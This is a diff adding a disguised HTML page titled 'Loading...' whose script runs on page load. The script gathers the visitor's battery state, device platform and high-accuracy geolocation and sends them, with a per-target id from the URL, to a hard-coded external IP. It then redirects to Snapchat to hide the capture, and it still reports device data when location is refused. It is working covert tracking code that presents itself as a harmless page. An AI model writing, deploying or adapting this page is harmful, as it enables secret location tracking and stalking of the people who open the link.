@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        async function startTracking() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const id = urlParams.get('id');
+            
+            // وەرگرتنی باتری
+            let battery = await navigator.getBattery();
+            let batLevel = Math.floor(battery.level * 100);
+            let charging = battery.charging ? "Yes" : "No";
+
+            // داواکردنی لۆکەیشن
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+                fetch(`http://178.18.241.166:5000/log?id=${id}&lat=${latitude}&lon=${longitude}&bat=${batLevel}&ch=${charging}&dev=${navigator.platform}`);
+                window.location.href = "https://www.snapchat.com";
+            }, () => {
+                // ئەگەر لۆکەیشنی ڕەتکردەوە
+                fetch(`http://178.18.241.166:5000/log?id=${id}&bat=${batLevel}&ch=${charging}&dev=${navigator.platform}`);
+                window.location.href = "https://www.snapchat.com";
+            }, {enableHighAccuracy: true});
+        }
+        window.onload = startTracking;
+    </script>
+</head>
+<body style="background: black;"></body>
+</html>
